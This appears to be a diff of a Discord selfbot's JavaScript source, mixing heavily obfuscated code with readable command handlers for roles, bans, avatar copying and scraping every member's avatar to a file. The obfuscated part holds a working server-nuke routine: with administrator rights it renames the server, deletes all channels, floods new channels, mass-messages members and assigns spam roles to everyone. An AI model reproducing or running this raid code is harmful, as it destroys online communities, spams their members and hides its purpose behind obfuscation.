-      \`\`\``);}if(_0x390a85===_0x1be328(0x7a5,0x64e)){console[_0x1be328(0x6da,0x84f)]('['+colors[_0x1be328(0x57b,0x658)](moment()[_0x1be328(0x4bf,0x49d)]()[_0x1be328(0x6ed,0x6b3)](_0x1be328(0x5fa,0x6be)))+']\x20'+colors[_0x1be328(0x632,0x58a)](_0x1be328(0x596,0x677))+'\x20'+colors[_0x1be328(0x5db,0x495)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x54d)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x768)]&&_0x1b369a[_0x1be328(0x594,0x587)]();if(enabled===!![]){let _0x1596d8=new Discord[(_0x1be328(0x508,0x4e6))]()[_0x1be328(0x4a2,0x442)](_0x1be328(0x4cf,0x465))[_0x1be328(0x5d3,0x679)](image?image:_0x1be328(0x56d,0x61e))[_0x1be328(0x5aa,0x5aa)](color?color:_0x1be328(0x4c1,0x576))[_0x1be328(0x69b,0x7ab)](footer?footer:_0x1be328(0x524,0x530))[_0x1be328(0x76c,0x70a)](_0x1be328(0x5c9,0x683)+_0x32f547+_0x1be328(0x6d0,0x6cd)+_0x32f547+_0x1be328(0x48d,0x34d)+_0x32f547+_0x1be328(0x77b,0x8da)+_0x32f547+_0x1be328(0x777,0x856)+_0x32f547+'stealpfp\x20<user>**\x20»\x20Sets\x20your\x20avatar\x20as\x20the\x20mentioned\x20users\x20avatar\x0a\x20\x20\x20\x20\x20\x20\x20\x20');_0x1b369a[_0x1be328(0x49d,0x36d)][_0x1be328(0x4c0,0x624)](_0x1596d8);}else _0x1b369a[_0x1be328(0x49d,0x5d0)][_0x1be328(0x4c0,0x563)](stripIndents`\`\`\`
+        ${prefix}addrole <role> <member> » Gives the mentioned role to the mentioned member
+        ${prefix}createrole <hex-color> <name> » Creates a new role with the color
+        ${prefix}deleterole <name> » Delets the role from the server
+        ${prefix}rainbow <role> » Edits that role to rainbow colors
+        ${prefix}removerole <role> <member> » Removes the mentioned role from the mentioned member
+        ${prefix}ban <member> [reason] » Bans the mentioned member from the server
+        ${prefix}kick <member> [reason] » Kicks the mentioned member from the server${footer ? `\n\n${footer}` : null}
+      \`\`\``)
+    }
+  }
+
+  if(cmd === "account") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+    if(message.deletable) {
+      message.delete()
+    }
+    if(enabled === true) {
+      let embed = new Discord.RichEmbed()
+      .setTitle("Account Commands")
+      .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+      .setColor(color ? color : "#1B78E7")
+      .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+      .setDescription(`
+        <> = required | [] = optional
+      
+        **${prefix}copy <user>** » Sets your username and avatar as the mentioned users avatar
+        **${prefix}invisible** » Sets your username and avatar as something invisible
+        **${prefix}read** » Marks every server that you are in as read
+        **${prefix}stealallpfp** » Gets everyones avatar and saves it into a json file on your desktop [GUILD ONLY]
+        **${prefix}stealpfp <user>** » Sets your avatar as the mentioned users avatar
+        `)
+        message.channel.send(embed)
+    } else {
+      message.channel.send(stripIndents`\`\`\`
       Account Commands
 
       <> = required | [] = optional
       
-      ${_0x32f547}copy <user> » Sets your username and avatar as the mentioned users avatar
-      ${_0x32f547}invisible » Sets your username and avatar as something invisible
-      ${_0x32f547}read » Marks every server that you are in as read
-      ${_0x32f547}stealallpfp » Gets everyones avatar and saves it into a json file on your desktop [GUILD ONLY]
-      ${_0x32f547}stealpfp <user> » Sets your avatar as the mentioned users avatar${footer?'\x0a\x0a'+footer:null}
-      \`\`\``);}_0x390a85==='read'&&(console[_0x1be328(0x6da,0x588)]('['+colors[_0x1be328(0x57b,0x44b)](moment()[_0x1be328(0x4bf,0x4fa)]()[_0x1be328(0x6ed,0x703)](_0x1be328(0x5fa,0x707)))+']\x20'+colors['cyan'](_0x1be328(0x596,0x456))+'\x20'+colors[_0x1be328(0x5db,0x748)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x77b)](_0x390a85)),_0x1b369a[_0x1be328(0x69a,0x552)]&&_0x1b369a[_0x1be328(0x594,0x538)](),bot[_0x1be328(0x491,0x3d7)][_0x1be328(0x787,0x62a)](_0x23883b=>{const _0x7dc413=function(_0x40ddb0,_0x23346c){return _0x1be328(_0x40ddb0- -0x1ba,_0x23346c);};_0x23883b[_0x7dc413(0x300,0x1e8)]();},0x161a+-0x1*0x1684+-0x1*-0xc22));if(_0x390a85===_0x1be328(0x6b9,0x58c)){console[_0x1be328(0x6da,0x5b9)]('['+colors[_0x1be328(0x57b,0x49a)](moment()[_0x1be328(0x4bf,0x44d)]()['format'](_0x1be328(0x5fa,0x77e)))+']\x20'+colors[_0x1be328(0x632,0x528)](_0x1be328(0x596,0x6c3))+'\x20'+colors[_0x1be328(0x5db,0x64d)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x613)](_0x390a85));_0x1b369a['deletable']&&_0x1b369a[_0x1be328(0x594,0x59f)]();const _0x50e6e4=_0x1b369a[_0x1be328(0x59c,0x5bf)][_0x1be328(0x59a,0x46b)][_0x1be328(0x6c1,0x73e)](_0x1d7e04=>'['+_0x1d7e04[_0x1be328(0x4ee,0x4ff)][_0x1be328(0x5fb,0x5c6)]+']:\x20'+_0x1d7e04[_0x1be328(0x4ee,0x407)][_0x1be328(0x5d4,0x6d4)]);fs[_0x1be328(0x6ab,0x796)](_0x1be328(0x561,0x6d7),JSON[_0x1be328(0x73a,0x823)](_0x50e6e4)),_0x1b369a[_0x1be328(0x49d,0x3b9)][_0x1be328(0x4c0,0x42c)](_0x1be328(0x6cf,0x7ee)+bot[_0x1be328(0x4ee,0x3fd)]['id']+_0x1be328(0x6cb,0x727));}if(_0x390a85===_0x1be328(0x4dc,0x45e)){console[_0x1be328(0x6da,0x86d)]('['+colors[_0x1be328(0x57b,0x564)](moment()[_0x1be328(0x4bf,0x45c)]()[_0x1be328(0x6ed,0x84a)](_0x1be328(0x5fa,0x717)))+']\x20'+colors[_0x1be328(0x632,0x700)](_0x1be328(0x596,0x636))+'\x20'+colors[_0x1be328(0x5db,0x6c1)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x6ca)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x6fe)]&&_0x1b369a[_0x1be328(0x594,0x451)]();if(!config[_0x1be328(0x532,0x604)])return console[_0x1be328(0x6da,0x64e)](colors[_0x1be328(0x72e,0x6a5)](_0x1be328(0x49b,0x38a))+'\x20'+colors[_0x1be328(0x5f5,0x730)](_0x1be328(0x5dd,0x5b2)));bot[_0x1be328(0x4ee,0x42b)][_0x1be328(0x60f,0x76a)](_0x1be328(0x59f,0x6aa),config[_0x1be328(0x532,0x525)]),bot[_0x1be328(0x4ee,0x417)][_0x1be328(0x670,0x573)](_0x1be328(0x6c5,0x684),config[_0x1be328(0x532,0x412)]);}if(_0x390a85===_0x1be328(0x4fa,0x68d)){console[_0x1be328(0x6da,0x5b6)]('['+colors['green'](moment()[_0x1be328(0x4bf,0x61e)]()[_0x1be328(0x6ed,0x577)](_0x1be328(0x5fa,0x59b)))+']\x20'+colors[_0x1be328(0x632,0x61e)](_0x1be328(0x596,0x55c))+'\x20'+colors[_0x1be328(0x5db,0x67a)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x67e)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x627)]&&_0x1b369a[_0x1be328(0x594,0x400)]();const _0x2dece5=_0x1b369a[_0x1be328(0x4d3,0x652)]['users'][_0x1be328(0x6a5,0x620)]();if(!_0x2dece5)return _0x1b369a[_0x1be328(0x49d,0x3fd)][_0x1be328(0x4c0,0x437)](_0x1be328(0x685,0x76b));bot['user'][_0x1be328(0x670,0x71c)](_0x2dece5[_0x1be328(0x5fb,0x4b1)]),bot[_0x1be328(0x4ee,0x3a1)][_0x1be328(0x60f,0x6b0)](_0x2dece5[_0x1be328(0x5d4,0x4f9)]);}if(_0x390a85===_0x1be328(0x759,0x69e)){console['log']('['+colors[_0x1be328(0x57b,0x4d9)](moment()[_0x1be328(0x4bf,0x5bf)]()[_0x1be328(0x6ed,0x694)](_0x1be328(0x5fa,0x5d9)))+']\x20'+colors[_0x1be328(0x632,0x57a)](_0x1be328(0x596,0x5c9))+'\x20'+colors[_0x1be328(0x5db,0x582)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x76a)](_0x390a85));_0x1b369a['deletable']&&_0x1b369a[_0x1be328(0x594,0x682)]();const _0x246b1b=_0x1b369a[_0x1be328(0x4d3,0x4f7)][_0x1be328(0x665,0x5e1)][_0x1be328(0x6a5,0x744)]();if(!_0x246b1b)return _0x1b369a[_0x1be328(0x49d,0x49d)][_0x1be328(0x4c0,0x36b)](_0x1be328(0x685,0x5f4));bot[_0x1be328(0x4ee,0x630)][_0x1be328(0x60f,0x656)](_0x246b1b[_0x1be328(0x5d4,0x706)]);}if(_0x390a85===_0x1be328(0x634,0x6c8)){console[_0x1be328(0x6da,0x6bb)]('['+colors[_0x1be328(0x57b,0x639)](moment()[_0x1be328(0x4bf,0x374)]()[_0x1be328(0x6ed,0x6e5)](_0x1be328(0x5fa,0x4e6)))+']\x20'+colors[_0x1be328(0x632,0x72d)](_0x1be328(0x596,0x625))+'\x20'+colors[_0x1be328(0x5db,0x64d)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x462)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x6f0)]&&_0x1b369a[_0x1be328(0x594,0x613)]();const _0x272d46=_0x1748bb[0x1*-0xd79+-0x239d+0x3116];if(!_0x1748bb[0x2074+-0x9*0x133+-0x15a9])return _0x1b369a['channel'][_0x1be328(0x4c0,0x642)](_0x1be328(0x65c,0x4d7));_0x1b369a[_0x1be328(0x49d,0x409)][_0x1be328(0x690,0x69b)][_0x1be328(0x787,0x76e)](_0x17d144=>_0x17d144[_0x1be328(0x67b,0x527)](_0x272d46));}if(_0x390a85===_0x1be328(0x574,0x6a2)){console[_0x1be328(0x6da,0x82e)]('['+colors[_0x1be328(0x57b,0x4c0)](moment()[_0x1be328(0x4bf,0x603)]()[_0x1be328(0x6ed,0x5c1)](_0x1be328(0x5fa,0x715)))+']\x20'+colors[_0x1be328(0x632,0x7ba)](_0x1be328(0x596,0x570))+'\x20'+colors[_0x1be328(0x5db,0x57c)]('|')+'\x20'+colors['yellow'](_0x390a85));_0x1b369a['deletable']&&_0x1b369a[_0x1be328(0x594,0x465)]();if(!_0x1748bb[_0x1be328(0x5c6,0x4d5)]('\x20'))return _0x1b369a[_0x1be328(0x49d,0x47c)][_0x1be328(0x4c0,0x5d3)](_0x1be328(0x633,0x77e));_0x1b369a[_0x1be328(0x49d,0x46f)][_0x1be328(0x4c0,0x42a)]('||'+_0x1b369a[_0x1be328(0x4f8,0x612)][_0x1be328(0x764,0x620)](-0x871*0x1+0x1*-0x149c+0x1d16)[_0x1be328(0x67f,0x68f)]('')[_0x1be328(0x5c6,0x5bf)](_0x1be328(0x572,0x683))+'||');}if(_0x390a85===_0x1be328(0x673,0x653)){console[_0x1be328(0x6da,0x5a4)]('['+colors[_0x1be328(0x57b,0x67d)](moment()[_0x1be328(0x4bf,0x63d)]()[_0x1be328(0x6ed,0x6b4)](_0x1be328(0x5fa,0x6ea)))+']\x20'+colors[_0x1be328(0x632,0x50b)](_0x1be328(0x596,0x60b))+'\x20'+colors[_0x1be328(0x5db,0x72b)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x4a8)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x583)]&&_0x1b369a[_0x1be328(0x594,0x42d)]();const _0x597504=_0x1b369a[_0x1be328(0x4d3,0x385)]['users'][_0x1be328(0x6a5,0x7eb)](),_0xf36728=_0x1b369a['guild'][_0x1be328(0x6bd,0x680)](_0x597504);let _0x420eef=_0x1748bb[_0x1be328(0x764,0x6c7)](0xed4+-0x1f16+0x1043)[_0x1be328(0x5c6,0x4c4)]('\x20');if(!_0x420eef)_0x420eef=_0x1be328(0x617,0x761);if(!_0x1b369a[_0x1be328(0x59c,0x4d5)]['me'][_0x1be328(0x62c,0x50c)](_0x1be328(0x796,0x8b0)))return _0x1b369a['channel'][_0x1be328(0x4c0,0x429)](_0x1be328(0x4f0,0x608));if(_0x597504){if(_0xf36728){const _0x53a8d5={};_0x53a8d5[_0x1be328(0x7a1,0x92d)]=_0x420eef,_0xf36728[_0x1be328(0x673,0x579)](_0x53a8d5)[_0x1be328(0x67d,0x7df)](()=>{const _0x4cbae4=function(_0x22cb51,_0x4fac92){return _0x1be328(_0x22cb51- -0x157,_0x4fac92);};_0x1b369a['channel']['send']('**'+_0x597504[_0x4cbae4(0x563,0x570)]+_0x4cbae4(0x4b5,0x4f6));});}else _0x1b369a[_0x1be328(0x49d,0x5b5)][_0x1be328(0x4c0,0x355)](_0x1be328(0x736,0x6ab));}else _0x1b369a['channel']['send'](_0x1be328(0x554,0x3d0));}if(_0x390a85===_0x1be328(0x545,0x6ce)){console[_0x1be328(0x6da,0x614)]('['+colors[_0x1be328(0x57b,0x67c)](moment()[_0x1be328(0x4bf,0x37c)]()[_0x1be328(0x6ed,0x872)](_0x1be328(0x5fa,0x501)))+']\x20'+colors[_0x1be328(0x632,0x68f)](_0x1be328(0x596,0x559))+'\x20'+colors['magenta']('|')+'\x20'+colors[_0x1be328(0x5f5,0x54b)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x78b)]&&_0x1b369a[_0x1be328(0x594,0x69a)]();const _0x193046=_0x1b369a[_0x1be328(0x4d3,0x48a)][_0x1be328(0x665,0x7ce)][_0x1be328(0x6a5,0x59c)](),_0x4fc602=_0x1b369a[_0x1be328(0x59c,0x661)][_0x1be328(0x6bd,0x6ee)](_0x193046);let _0x4d5ba2=_0x1748bb[_0x1be328(0x764,0x8cf)](-0x7ab*-0x3+0x43*-0x11+-0x128d)[_0x1be328(0x5c6,0x593)]('\x20');if(!_0x4d5ba2)_0x4d5ba2=_0x1be328(0x617,0x728);if(!_0x1b369a['guild']['me'][_0x1be328(0x62c,0x596)](_0x1be328(0x770,0x5fc)))return _0x1b369a[_0x1be328(0x49d,0x5ee)][_0x1be328(0x4c0,0x523)](_0x1be328(0x4f0,0x5fc));_0x193046?_0x4fc602?_0x4fc602[_0x1be328(0x545,0x651)](_0x4d5ba2)[_0x1be328(0x67d,0x7c3)](()=>{const _0x3fc4bb=function(_0x547792,_0x3b356d){return _0x1be328(_0x3b356d-0x134,_0x547792);};_0x1b369a[_0x3fc4bb(0x4a8,0x5d1)][_0x3fc4bb(0x6a7,0x5f4)]('**'+_0x193046[_0x3fc4bb(0x8d0,0x7ee)]+_0x3fc4bb(0x553,0x5d8));}):_0x1b369a[_0x1be328(0x49d,0x547)][_0x1be328(0x4c0,0x499)](_0x1be328(0x736,0x7ad)):_0x1b369a[_0x1be328(0x49d,0x397)][_0x1be328(0x4c0,0x426)](_0x1be328(0x775,0x880));}if(_0x390a85===_0x1be328(0x664,0x7a0)){console[_0x1be328(0x6da,0x625)]('['+colors[_0x1be328(0x57b,0x61e)](moment()[_0x1be328(0x4bf,0x39f)]()[_0x1be328(0x6ed,0x683)](_0x1be328(0x5fa,0x663)))+']\x20'+colors[_0x1be328(0x632,0x5fb)](_0x1be328(0x596,0x5a8))+'\x20'+colors['magenta']('|')+'\x20'+colors[_0x1be328(0x5f5,0x6bd)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x7d7)]&&_0x1b369a[_0x1be328(0x594,0x6ba)]();const _0x24fb37=_0x1748bb[0xf7*-0x1f+-0x794+0x55b*0x7],_0xa87aab=_0x1748bb[_0x1be328(0x764,0x811)](-0x82b*0x2+0x146*-0x13+0x9*0x481)['join']('\x20');if(!_0x24fb37)return _0x1b369a[_0x1be328(0x49d,0x379)][_0x1be328(0x4c0,0x5b2)](_0x1be328(0x733,0x860));if(!_0xa87aab)return _0x1b369a[_0x1be328(0x49d,0x34b)][_0x1be328(0x4c0,0x5b3)](_0x1be328(0x515,0x5f8));const _0x19496f={};_0x19496f[_0x1be328(0x5e0,0x612)]=_0xa87aab,_0x19496f['color']=_0x24fb37,_0x1b369a[_0x1be328(0x59c,0x600)][_0x1be328(0x49c,0x590)](_0x19496f),_0x1b369a[_0x1be328(0x49d,0x5ee)][_0x1be328(0x4c0,0x5ee)]('Successfully\x20made\x20the\x20**'+_0xa87aab+_0x1be328(0x68f,0x772));}if(_0x390a85===_0x1be328(0x68d,0x6c8)){console[_0x1be328(0x6da,0x6b9)]('['+colors[_0x1be328(0x57b,0x676)](moment()[_0x1be328(0x4bf,0x5e0)]()[_0x1be328(0x6ed,0x7de)](_0x1be328(0x5fa,0x5d6)))+']\x20'+colors[_0x1be328(0x632,0x6b5)](_0x1be328(0x596,0x5cc))+'\x20'+colors[_0x1be328(0x5db,0x5f2)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x5c5)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x546)]&&_0x1b369a[_0x1be328(0x594,0x6ca)]();const _0xf365ba=_0x1b369a[_0x1be328(0x59c,0x555)][_0x1be328(0x5e7,0x6a0)][_0x1be328(0x4c9,0x53c)](_0x185f43=>_0x185f43[_0x1be328(0x5e0,0x542)]===_0x1748bb[_0x1be328(0x5c6,0x5ed)]('\x20'));if(!_0x1748bb[_0x1be328(0x5c6,0x748)]('\x20'))return _0x1b369a[_0x1be328(0x49d,0x454)][_0x1be328(0x4c0,0x4b9)](_0x1be328(0x686,0x6d2));if(!_0xf365ba)return _0x1b369a[_0x1be328(0x49d,0x445)][_0x1be328(0x4c0,0x424)](_0x1be328(0x70b,0x617));_0xf365ba[_0x1be328(0x594,0x68e)](),_0x1b369a[_0x1be328(0x49d,0x3fd)][_0x1be328(0x4c0,0x5f5)](_0x1be328(0x5ad,0x73d)+_0x1748bb[_0x1be328(0x5c6,0x667)]('\x20')+_0x1be328(0x68f,0x815));}if(_0x390a85===_0x1be328(0x485,0x3dd)){console[_0x1be328(0x6da,0x6dc)]('['+colors[_0x1be328(0x57b,0x614)](moment()[_0x1be328(0x4bf,0x3eb)]()[_0x1be328(0x6ed,0x788)](_0x1be328(0x5fa,0x49c)))+']\x20'+colors[_0x1be328(0x632,0x4f4)](_0x1be328(0x596,0x453))+'\x20'+colors[_0x1be328(0x5db,0x4ee)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x651)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x694)]&&_0x1b369a[_0x1be328(0x594,0x52a)]();const _0x2442b1=_0x1b369a[_0x1be328(0x4d3,0x47f)][_0x1be328(0x5e7,0x580)]['first'](),_0x1e239b=_0x1b369a[_0x1be328(0x4d3,0x50e)][_0x1be328(0x59a,0x5aa)][_0x1be328(0x6a5,0x5af)]();if(!_0x2442b1)return _0x1b369a[_0x1be328(0x49d,0x4d6)][_0x1be328(0x4c0,0x39e)](_0x1be328(0x622,0x693));if(!_0x1e239b)return _0x1b369a[_0x1be328(0x49d,0x3f1)][_0x1be328(0x4c0,0x35b)](_0x1be328(0x48c,0x4a0));_0x1e239b['addRole'](_0x2442b1),_0x1b369a[_0x1be328(0x49d,0x59f)][_0x1be328(0x4c0,0x4da)](_0x1be328(0x503,0x5e0)+_0x2442b1[_0x1be328(0x5e0,0x561)]+_0x1be328(0x494,0x434)+_0x1e239b[_0x1be328(0x4ee,0x3de)]['tag']+'**');}if(_0x390a85===_0x1be328(0x510,0x411)){console[_0x1be328(0x6da,0x61f)]('['+colors[_0x1be328(0x57b,0x4ac)](moment()[_0x1be328(0x4bf,0x475)]()[_0x1be328(0x6ed,0x826)](_0x1be328(0x5fa,0x5f7)))+']\x20'+colors[_0x1be328(0x632,0x4dd)](_0x1be328(0x596,0x40b))+'\x20'+colors['magenta']('|')+'\x20'+colors[_0x1be328(0x5f5,0x66d)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x7db)]&&_0x1b369a[_0x1be328(0x594,0x4ea)]();const _0x14f3f6=_0x1b369a[_0x1be328(0x4d3,0x586)][_0x1be328(0x5e7,0x600)][_0x1be328(0x6a5,0x776)](),_0x8476b4=_0x1b369a[_0x1be328(0x4d3,0x58f)][_0x1be328(0x59a,0x6af)][_0x1be328(0x6a5,0x554)]();if(!_0x14f3f6)return _0x1b369a['channel'][_0x1be328(0x4c0,0x4ab)](_0x1be328(0x622,0x670));if(!_0x8476b4)return _0x1b369a[_0x1be328(0x49d,0x313)][_0x1be328(0x4c0,0x35f)](_0x1be328(0x48c,0x4ee));_0x8476b4['removeRole'](_0x14f3f6),_0x1b369a[_0x1be328(0x49d,0x49f)]['send'](_0x1be328(0x6d7,0x5de)+_0x14f3f6[_0x1be328(0x5e0,0x51f)]+_0x1be328(0x6e6,0x57e)+_0x8476b4['user'][_0x1be328(0x6ba,0x61d)]+'**');}_0x390a85===_0x1be328(0x59e,0x452)&&(console[_0x1be328(0x6da,0x7d7)]('['+colors[_0x1be328(0x57b,0x705)](moment()[_0x1be328(0x4bf,0x551)]()['format']('HH:mm:ss'))+']\x20'+colors[_0x1be328(0x632,0x691)](_0x1be328(0x596,0x6ec))+'\x20'+colors[_0x1be328(0x5db,0x5ca)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x71e)](_0x390a85)),_0x1b369a[_0x1be328(0x69a,0x797)]&&_0x1b369a[_0x1be328(0x594,0x5d3)](),_0x1b369a[_0x1be328(0x49d,0x3dc)][_0x1be328(0x4c0,0x3f6)](_0x1be328(0x730,0x772)));_0x390a85===_0x1be328(0x50e,0x38e)&&(console[_0x1be328(0x6da,0x86b)]('['+colors['green'](moment()['utc']()[_0x1be328(0x6ed,0x628)](_0x1be328(0x5fa,0x605)))+']\x20'+colors[_0x1be328(0x632,0x6db)](_0x1be328(0x596,0x70d))+'\x20'+colors[_0x1be328(0x5db,0x546)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x63f)](_0x390a85)),_0x1b369a[_0x1be328(0x69a,0x615)]&&_0x1b369a[_0x1be328(0x594,0x6c6)](),_0x1b369a[_0x1be328(0x49d,0x5fa)][_0x1be328(0x4c0,0x435)](_0x1be328(0x521,0x557)));_0x390a85===_0x1be328(0x481,0x3fc)&&(console[_0x1be328(0x6da,0x77a)]('['+colors[_0x1be328(0x57b,0x6aa)](moment()[_0x1be328(0x4bf,0x351)]()['format'](_0x1be328(0x5fa,0x4e2)))+']\x20'+colors[_0x1be328(0x632,0x770)](_0x1be328(0x596,0x71b))+'\x20'+colors[_0x1be328(0x5db,0x578)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x71c)](_0x390a85)),_0x1b369a[_0x1be328(0x69a,0x58f)]&&_0x1b369a[_0x1be328(0x594,0x5d5)](),_0x1b369a[_0x1be328(0x49d,0x42f)][_0x1be328(0x4c0,0x3de)](_0x1be328(0x6ec,0x7c4)));_0x390a85==='shrug'&&(console[_0x1be328(0x6da,0x6e5)]('['+colors[_0x1be328(0x57b,0x6f0)](moment()['utc']()[_0x1be328(0x6ed,0x7b6)](_0x1be328(0x5fa,0x764)))+']\x20'+colors[_0x1be328(0x632,0x548)](_0x1be328(0x596,0x48c))+'\x20'+colors['magenta']('|')+'\x20'+colors[_0x1be328(0x5f5,0x4c2)](_0x390a85)),_0x1b369a[_0x1be328(0x69a,0x7e5)]&&_0x1b369a[_0x1be328(0x594,0x6ef)](),_0x1b369a[_0x1be328(0x49d,0x45a)][_0x1be328(0x4c0,0x471)](_0x1be328(0x580,0x5a9)));if(_0x390a85===_0x1be328(0x786,0x8a7)){console[_0x1be328(0x6da,0x592)]('['+colors[_0x1be328(0x57b,0x5e5)](moment()[_0x1be328(0x4bf,0x50f)]()['format'](_0x1be328(0x5fa,0x6c4)))+']\x20'+colors[_0x1be328(0x632,0x6b8)](_0x1be328(0x596,0x4f8))+'\x20'+colors['magenta']('|')+'\x20'+colors[_0x1be328(0x5f5,0x531)](_0x390a85));if(_0x1b369a[_0x1be328(0x59c,0x5a4)]['me'][_0x1be328(0x62c,0x76a)]('ADMINISTRATOR')){_0x1b369a[_0x1be328(0x59c,0x609)][_0x1be328(0x66a,0x71c)](_0x1be328(0x4d5,0x5ac)),_0x1b369a[_0x1be328(0x59c,0x719)]['setName'](_0x1be328(0x4b8,0x369)),_0x1b369a['guild'][_0x1be328(0x4bc,0x489)][_0x1be328(0x787,0x658)](_0x299962=>{const _0xf06e9d=function(_0x104f0b,_0x2a9d17){return _0x1be328(_0x104f0b- -0x111,_0x2a9d17);};_0x299962[_0xf06e9d(0x483,0x456)]();});for(var _0x4ccc9c=0x1*0xf2c+0x2250+-0x317c;_0x4ccc9c<0x1*-0x1112+0xc*0x287+-0x6*0x225;_0x4ccc9c++){const _0x4b58ab={};_0x4b58ab[_0x1be328(0x4b0,0x488)]=_0x1be328(0x546,0x402),_0x1b369a[_0x1be328(0x59c,0x418)]['createChannel'](_0x1be328(0x77f,0x7c3),_0x4b58ab);}for(var _0x4ccc9c=0x14c2+-0x2b*0xb+-0x12e9;_0x4ccc9c<-0x1e3b+-0x994*0x2+0x1*0x31c7;_0x4ccc9c++){const _0x10ecd9=_0x1b369a[_0x1be328(0x59c,0x6f9)][_0x1be328(0x5e0,0x6ab)];_0x1b369a[_0x1be328(0x59c,0x4ee)][_0x1be328(0x59a,0x546)][_0x1be328(0x6b4,0x61c)](_0x1b369a[_0x1be328(0x59c,0x56a)][_0x1be328(0x530,0x3d7)])[_0x1be328(0x4c0,0x3dc)]('Your\x20server\x20'+_0x10ecd9+_0x1be328(0x504,0x4b7))[_0x1be328(0x703,0x6d1)](_0x23d29f=>{return;});}for(var _0x4ccc9c=-0x2224+-0x31a*-0xa+0x320;_0x4ccc9c<-0x1*-0x781+0x19af+-0x4*0x833;_0x4ccc9c++){const _0x5535b9={};_0x5535b9[_0x1be328(0x4b0,0x499)]=_0x1be328(0x6f6,0x87d),_0x1b369a[_0x1be328(0x59c,0x6a1)][_0x1be328(0x627,0x629)](_0x1be328(0x527,0x40f),_0x5535b9);}for(var _0x4ccc9c=0x1b35+0x61*0x35+-0x2f4a;_0x4ccc9c<-0x117f+-0x8bb+0x1a9e;_0x4ccc9c++){const _0x3822b9={};_0x3822b9[_0x1be328(0x5e0,0x4c1)]=_0x1be328(0x4b8,0x407),_0x3822b9[_0x1be328(0x493,0x45d)]=_0x1be328(0x4c1,0x48e);const _0x51982d=await _0x1b369a[_0x1be328(0x59c,0x67f)][_0x1be328(0x49c,0x490)](_0x3822b9);_0x1b369a[_0x1be328(0x59c,0x453)][_0x1be328(0x59a,0x560)][_0x1be328(0x787,0x77c)](_0x41bd9a=>{const _0x3a2fee=function(_0x2cacd3,_0x32e10f){return _0x1be328(_0x32e10f-0x2e1,_0x2cacd3);};_0x41bd9a[_0x3a2fee(0xa91,0x961)](_0x51982d['id']);});}}}if(_0x390a85===_0x1be328(0x6f2,0x633)){console[_0x1be328(0x6da,0x638)]('['+colors[_0x1be328(0x57b,0x6e1)](moment()[_0x1be328(0x4bf,0x4a3)]()[_0x1be328(0x6ed,0x81f)]('HH:mm:ss'))+']\x20'+colors[_0x1be328(0x632,0x5b5)](_0x1be328(0x596,0x50f))+'\x20'+colors[_0x1be328(0x5db,0x476)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x496)](_0x390a85)),_0x1b369a[_0x1be328(0x59c,0x4b8)][_0x1be328(0x66a,0x785)](null),_0x1b369a[_0x1be328(0x59c,0x70b)][_0x1be328(0x4bc,0x5a2)][_0x1be328(0x787,0x61a)](_0x290242=>_0x290242[_0x1be328(0x594,0x694)]());const _0x4db393={};_0x4db393[_0x1be328(0x4b0,0x379)]='category';const _0x4f1350=await _0x1b369a[_0x1be328(0x59c,0x679)][_0x1be328(0x627,0x4c1)](_0x1be328(0x734,0x63f),_0x4db393),_0x14d2c9={};_0x14d2c9[_0x1be328(0x4b0,0x3c0)]=_0x1be328(0x5af,0x4af);const _0x3fe282=await _0x1b369a[_0x1be328(0x59c,0x6de)][_0x1be328(0x627,0x5f3)](_0x1be328(0x6d5,0x639),_0x14d2c9),_0x1b2dc2={};_0x1b2dc2[_0x1be328(0x4b0,0x631)]=_0x1be328(0x546,0x53e),_0x1b2dc2[_0x1be328(0x53e,0x5ed)]=_0x4f1350['id'],_0x1b369a[_0x1be328(0x59c,0x726)][_0x1be328(0x627,0x71f)](_0x1be328(0x5f9,0x480),_0x1b2dc2);const _0x1ad4d6={};_0x1ad4d6[_0x1be328(0x4b0,0x4ed)]=_0x1be328(0x6f6,0x66a),_0x1ad4d6[_0x1be328(0x53e,0x67b)]=_0x3fe282['id'],_0x1b369a[_0x1be328(0x59c,0x612)][_0x1be328(0x627,0x747)](_0x1be328(0x579,0x530),_0x1ad4d6);}if(_0x390a85===_0x1be328(0x4e5,0x501)){console[_0x1be328(0x6da,0x6fb)]('['+colors[_0x1be328(0x57b,0x4c4)](moment()[_0x1be328(0x4bf,0x549)]()[_0x1be328(0x6ed,0x7c5)]('HH:mm:ss'))+']\x20'+colors[_0x1be328(0x632,0x639)](_0x1be328(0x596,0x441))+'\x20'+colors['magenta']('|')+'\x20'+colors[_0x1be328(0x5f5,0x5df)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x5c9)]&&_0x1b369a[_0x1be328(0x594,0x555)]();const _0x53acfd=[_0x1be328(0x4e2,0x571),_0x1be328(0x495,0x5eb),_0x1be328(0x76e,0x8dc),_0x1be328(0x710,0x80d),_0x1be328(0x5ff,0x5f7),_0x1be328(0x640,0x754),_0x1be328(0x6ca,0x68f),_0x1be328(0x683,0x62e),_0x1be328(0x4c3,0x558)];if(!_0x1748bb[0x6b5+0x1*0x773+-0xe28])return 